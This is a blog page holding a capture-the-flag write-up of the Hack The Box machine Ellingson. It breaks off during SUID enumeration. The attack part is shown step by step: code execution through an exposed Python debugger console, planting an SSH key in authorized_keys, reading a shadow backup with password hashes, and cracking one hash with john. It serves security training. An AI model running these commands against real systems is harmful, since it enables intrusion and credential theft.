<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Ellingson - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="0xRick" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="/misc/c2">Building a Basic C2</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-Ellingson"><a href="#Hack-The-Box-Ellingson" class="headerlink" title="Hack The Box - Ellingson"></a>Hack The Box - Ellingson</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys, today Ellingson retired and here’s my write-up about it. It was a fun box with a very nice binary exploitation privesc, I found the way of getting RCE on this box (which was by abusing the debugger of a python server that was running on the box) very interesting. It’s a Linux box and its ip is <code>10.10.10.139</code>, I added it to <code>/etc/hosts</code> as <code>ellingson.htb</code>. Let’s jump right in !<br><img src="/images/hackthebox/ellingson/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ellingson# nmap -sV -sT -sC -o nmapinitial ellingson.htb </span><br><span class="line">Starting Nmap 7.70 ( https:&#x2F;&#x2F;nmap.org ) at 2019-10-18 14:11 EET</span><br><span class="line">Nmap scan report for ellingson.htb (10.10.10.139)</span><br><span class="line">Host is up (0.13s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)</span><br><span class="line">|   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)</span><br><span class="line">|_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx&#x2F;1.14.0 (Ubuntu)</span><br><span class="line">| http-title: Ellingson Mineral Corp</span><br><span class="line">|_Requested resource was http:&#x2F;&#x2F;ellingson.htb&#x2F;index</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 26.79 seconds</span><br></pre></td></tr></table></figure>
<p>We got <code>http</code> on port 80 and <code>ssh</code> on port 22.</p>
<h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p>Let’s take a look at the index page:<br><code>http://ellingson.htb</code>:<br><img src="/images/hackthebox/ellingson/1.png" alt=""></p>
<p><img src="/images/hackthebox/ellingson/2.png" alt=""></p>
<p><img src="/images/hackthebox/ellingson/3.png" alt=""><br>The only interesting thing was these articles at the top of the page:<br><img src="/images/hackthebox/ellingson/1.png" alt=""><br>The first one was talking about a virus that was planted in their mainframe:<br><img src="/images/hackthebox/ellingson/4.png" alt=""><br>The second one was talking about a brute-force protection that was recently added which tells us not to attempt to bruteforce anything or we’ll get banned:<br><img src="/images/hackthebox/ellingson/5.png" alt=""><br>The third one was advising users to change their passwords because of some suspicious network activity that was detected, telling them that the most common passwords are Love, Secret, Sex and God:<br><img src="/images/hackthebox/ellingson/6.png" alt=""><br>So far the only interesting thing we have is the 4 common passwords.<br>The articles path followed this pattern: <code>/articles/n</code> (<code>n</code> is the article number) so I thought of trying different numbers to see if there’s a hidden article or something like that. When I tried <code>4</code> I got an error because that article doesn’t exist, I expected a <code>404</code> error but I got this debugger:<br><img src="/images/hackthebox/ellingson/7.png" alt=""><br>By hovering over one of the lines a small console icon appears, its description says that it open an interactive python shell:<br><img src="/images/hackthebox/ellingson/8.png" alt=""></p>
<p><img src="/images/hackthebox/ellingson/9.png" alt=""></p>
<p><img src="/images/hackthebox/ellingson/10.png" alt=""></p>
<h2 id="RCE-–-gt-SSH-as-hal"><a href="#RCE-–-gt-SSH-as-hal" class="headerlink" title="RCE –&gt; SSH as hal"></a>RCE –&gt; SSH as hal</h2><p>With <code>popen()</code> from <code>os</code> we can execute commands and read the output like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> (os.popen(<span class="string">'whoami'</span>).read())</span><br><span class="line">hal</span><br></pre></td></tr></table></figure>
<p>We are executing commands as <code>hal</code> who doesn’t have the user flag:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> (os.popen(<span class="string">'pwd'</span>).read())</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> (os.popen(<span class="string">'ls -la /home'</span>).read())</span><br><span class="line">total <span class="number">24</span></span><br><span class="line">drwxr-xr-x  <span class="number">6</span> root      root      <span class="number">4096</span> Mar  <span class="number">9</span>  <span class="number">2019</span> .</span><br><span class="line">drwxr-xr-x <span class="number">23</span> root      root      <span class="number">4096</span> Mar  <span class="number">9</span>  <span class="number">2019</span> ..</span><br><span class="line">drwxrwx---  <span class="number">3</span> duke      duke      <span class="number">4096</span> Mar <span class="number">10</span>  <span class="number">2019</span> duke</span><br><span class="line">drwxrwx---  <span class="number">5</span> hal       hal       <span class="number">4096</span> May  <span class="number">7</span> <span class="number">13</span>:<span class="number">12</span> hal</span><br><span class="line">drwxrwx---  <span class="number">6</span> margo     margo     <span class="number">4096</span> Oct <span class="number">18</span> <span class="number">11</span>:<span class="number">01</span> margo</span><br><span class="line">drwxrwx---  <span class="number">4</span> theplague theplague <span class="number">4096</span> May  <span class="number">7</span> <span class="number">13</span>:<span class="number">13</span> theplague</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> (os.popen(<span class="string">'ls -la /home/hal'</span>).read())</span><br><span class="line">total <span class="number">36</span></span><br><span class="line">drwxrwx--- <span class="number">5</span> hal  hal  <span class="number">4096</span> May  <span class="number">7</span> <span class="number">13</span>:<span class="number">12</span> .</span><br><span class="line">drwxr-xr-x <span class="number">6</span> root root <span class="number">4096</span> Mar  <span class="number">9</span>  <span class="number">2019</span> ..</span><br><span class="line">-rw-r--r-- <span class="number">1</span> hal  hal   <span class="number">220</span> Mar  <span class="number">9</span>  <span class="number">2019</span> .bash_logout</span><br><span class="line">-rw-r--r-- <span class="number">1</span> hal  hal  <span class="number">3771</span> Mar  <span class="number">9</span>  <span class="number">2019</span> .bashrc</span><br><span class="line">drwx------ <span class="number">2</span> hal  hal  <span class="number">4096</span> Mar <span class="number">10</span>  <span class="number">2019</span> .cache</span><br><span class="line">drwx------ <span class="number">3</span> hal  hal  <span class="number">4096</span> Mar <span class="number">10</span>  <span class="number">2019</span> .gnupg</span><br><span class="line">-rw-r--r-- <span class="number">1</span> hal  hal   <span class="number">807</span> Mar  <span class="number">9</span>  <span class="number">2019</span> .profile</span><br><span class="line">drwx------ <span class="number">2</span> hal  hal  <span class="number">4096</span> Oct <span class="number">18</span> <span class="number">08</span>:<span class="number">28</span> .ssh</span><br><span class="line">-rw------- <span class="number">1</span> hal  hal   <span class="number">865</span> Mar  <span class="number">9</span>  <span class="number">2019</span> .viminfo</span><br></pre></td></tr></table></figure>
<p>So we will need to be another user, however we need to get a shell first. We can simply <code>echo</code> our public key to <code>/home/hal/.ssh/auhtorized_keys</code> and get <code>ssh</code> as hal:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> (os.popen(<span class="string">'echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGEUzu7cGthWtPNXM5/rAvPBywgyh68AEpSyUBXm24kByXu+GhEmvAiVlkAhasBgTjiCbpup3dmzz54ADlo4T2jUWoVVEDOw82eKQ6EoqpYnHGVmpDmJ1n7+eCvb3ut0bl5VOnTkhYSWS8G9V6V+E/VmDun63HoHCHzvtBlbN/ZmhRKxdwNFSYN/NswU8MFK+MVXxa/FJUxrOJVAnefXQdfDBxIt4j/qqMr68u9lQfqOX5shmS0M55lFNAY2mR6INBQtT6AnAWremPCHdUHxU3eSvzUcItaamecSPTfDgMQDQkxXrrsKQLkJeCKZ/1EwDBXIF3RGCeNGq0hCYHSF8d root@kali\" &gt; /home/hal/.ssh/authorized_keys'</span>).read())</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ellingson# ssh -i .&#x2F;id_rsa hal@ellingson.htb </span><br><span class="line">Welcome to Ubuntu 18.04.1 LTS (GNU&#x2F;Linux 4.15.0-46-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https:&#x2F;&#x2F;help.ubuntu.com</span><br><span class="line"> * Management:     https:&#x2F;&#x2F;landscape.canonical.com</span><br><span class="line"> * Support:        https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage</span><br><span class="line"></span><br><span class="line">  System information as of Fri Oct 18 12:30:03 UTC 2019</span><br><span class="line"></span><br><span class="line">  System load:  0.0                Processes:            105</span><br><span class="line">  Usage of &#x2F;:   23.8% of 19.56GB   Users logged in:      1</span><br><span class="line">  Memory usage: 18%                IP address for ens33: 10.10.10.139</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line">  &#x3D;&gt; There is 1 zombie process.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available for installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https:&#x2F;&#x2F;ubuntu.com&#x2F;livepatch</span><br><span class="line"></span><br><span class="line">163 packages can be updated.</span><br><span class="line">80 updates are security updates.</span><br><span class="line"></span><br><span class="line">Failed to connect to https:&#x2F;&#x2F;changelogs.ubuntu.com&#x2F;meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Fri Oct 18 09:08:47 2019 from 10.10.15.92</span><br><span class="line">hal@ellingson:~$ whoami</span><br><span class="line">hal</span><br><span class="line">hal@ellingson:~$</span><br></pre></td></tr></table></figure>


<h2 id="shadow-bak-–-gt-SSH-as-margo"><a href="#shadow-bak-–-gt-SSH-as-margo" class="headerlink" title="shadow.bak –&gt; SSH as margo"></a>shadow.bak –&gt; SSH as margo</h2><p>There are 4 users on the box: <code>duke</code>, <code>hal</code>, <code>margo</code> and <code>theplague</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hal@ellingson:&#x2F;home$ ls -al</span><br><span class="line">total 24</span><br><span class="line">drwxr-xr-x  6 root      root      4096 Mar  9  2019 .</span><br><span class="line">drwxr-xr-x 23 root      root      4096 Mar  9  2019 ..</span><br><span class="line">drwxrwx---  3 duke      duke      4096 Mar 10  2019 duke</span><br><span class="line">drwxrwx---  5 hal       hal       4096 May  7 13:12 hal</span><br><span class="line">drwxrwx---  6 margo     margo     4096 Oct 18 11:01 margo</span><br><span class="line">drwxrwx---  4 theplague theplague 4096 May  7 13:13 theplague</span><br><span class="line">hal@ellingson:&#x2F;home$</span><br></pre></td></tr></table></figure>
<p>One of the places I always like to check when trying to escalate privileges is <code>/var/backups</code>. On this box there was a backup for <code>/etc/shadow</code> there:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">hal@ellingson:&#x2F;var&#x2F;backups$ ls -la</span><br><span class="line">total 708</span><br><span class="line">drwxr-xr-x  2 root root     4096 May  7 13:14 .</span><br><span class="line">drwxr-xr-x 14 root root     4096 Mar  9  2019 ..</span><br><span class="line">-rw-r--r--  1 root root    61440 Mar 10  2019 alternatives.tar.0</span><br><span class="line">-rw-r--r--  1 root root     8255 Mar  9  2019 apt.extended_states.0</span><br><span class="line">-rw-r--r--  1 root root      437 Jul 25  2018 dpkg.diversions.0</span><br><span class="line">-rw-r--r--  1 root root      295 Mar  9  2019 dpkg.statoverride.0</span><br><span class="line">-rw-r--r--  1 root root   615441 Mar  9  2019 dpkg.status.0</span><br><span class="line">-rw-------  1 root root      811 Mar  9  2019 group.bak</span><br><span class="line">-rw-------  1 root shadow    678 Mar  9  2019 gshadow.bak</span><br><span class="line">-rw-------  1 root root     1757 Mar  9  2019 passwd.bak</span><br><span class="line">-rw-r-----  1 root adm      1309 Mar  9  2019 shadow.bak</span><br><span class="line">hal@ellingson:&#x2F;var&#x2F;backups$ cat shadow.bak</span><br><span class="line">root:*:17737:0:99999:7:::</span><br><span class="line">daemon:*:17737:0:99999:7:::</span><br><span class="line">bin:*:17737:0:99999:7:::</span><br><span class="line">sys:*:17737:0:99999:7:::</span><br><span class="line">sync:*:17737:0:99999:7:::</span><br><span class="line">games:*:17737:0:99999:7:::</span><br><span class="line">man:*:17737:0:99999:7:::</span><br><span class="line">lp:*:17737:0:99999:7:::</span><br><span class="line">mail:*:17737:0:99999:7:::</span><br><span class="line">news:*:17737:0:99999:7:::</span><br><span class="line">uucp:*:17737:0:99999:7:::</span><br><span class="line">proxy:*:17737:0:99999:7:::</span><br><span class="line">www-data:*:17737:0:99999:7:::</span><br><span class="line">backup:*:17737:0:99999:7:::</span><br><span class="line">list:*:17737:0:99999:7:::</span><br><span class="line">irc:*:17737:0:99999:7:::</span><br><span class="line">gnats:*:17737:0:99999:7:::</span><br><span class="line">nobody:*:17737:0:99999:7:::</span><br><span class="line">systemd-network:*:17737:0:99999:7:::</span><br><span class="line">systemd-resolve:*:17737:0:99999:7:::</span><br><span class="line">syslog:*:17737:0:99999:7:::</span><br><span class="line">messagebus:*:17737:0:99999:7:::</span><br><span class="line">_apt:*:17737:0:99999:7:::</span><br><span class="line">lxd:*:17737:0:99999:7:::</span><br><span class="line">uuidd:*:17737:0:99999:7:::</span><br><span class="line">dnsmasq:*:17737:0:99999:7:::</span><br><span class="line">landscape:*:17737:0:99999:7:::</span><br><span class="line">pollinate:*:17737:0:99999:7:::</span><br><span class="line">sshd:*:17737:0:99999:7:::</span><br><span class="line">theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj&#x2F;aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot&#x2F;:17964:0:99999:7:::</span><br><span class="line">hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0&#x2F;i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::</span><br><span class="line">margo:$6$Lv8rcvK8$la&#x2F;ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G&#x2F;kbd72poeAnyJL4c1:17964:0:99999:7:::</span><br><span class="line">duke:$6$bFjry0BT$OtPFpMfL&#x2F;KuUZOafZalqHINNX&#x2F;acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc&#x2F;:17964:0:99999:7:::</span><br><span class="line">hal@ellingson:&#x2F;var&#x2F;backups$</span><br></pre></td></tr></table></figure>
<p>First time I solved the box I created a list with all password combinations from rockyou that had the words “love, secret, sex and god” (most common passwords we saw earlier) and tried to crack the 3 hashes with it. I could get <code>margo</code>‘s password which had “god” in it. </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ellingson# echo &#39;margo:$6$Lv8rcvK8$la&#x2F;ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G&#x2F;kbd72poeAnyJL4c1:17964:0:99999:7:::&#39; &gt; margo.hash</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ellingson# grep -i god &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt &gt; list.txt</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ellingson# john --wordlist&#x3D;.&#x2F;list.txt margo.hash </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128&#x2F;128 AVX 2x])</span><br><span class="line">Cost 1 (iteration count) is 5000 for all loaded hashes</span><br><span class="line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">iamgod$08        (margo)</span><br><span class="line">1g 0:00:00:08 DONE (2019-10-18 14:58) 0.1234g&#x2F;s 829.6p&#x2F;s 829.6c&#x2F;s 829.6C&#x2F;s iamgod22..hydrogod20</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
<p>Now we can simply <code>ssh</code> into the box as <code>margo : iamgod$08</code>:<br><img src="/images/hackthebox/ellingson/11.png" alt=""></p>
<p>We owned user.</p>
<h2 id="Binary-Analysis"><a href="#Binary-Analysis" class="headerlink" title="Binary: Analysis"></a>Binary: Analysis</h2><p>I searched for <code>suid</code> binaries and found a strange binary called <code>garbage</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">margo@ellingson:~$ find &#x2F; -perm -4000 2&gt;&#x2F;dev&#x2F;null            </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;at        </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp        </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pkexec        </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd       </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd        </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;garbage      </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newuidmap           </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span 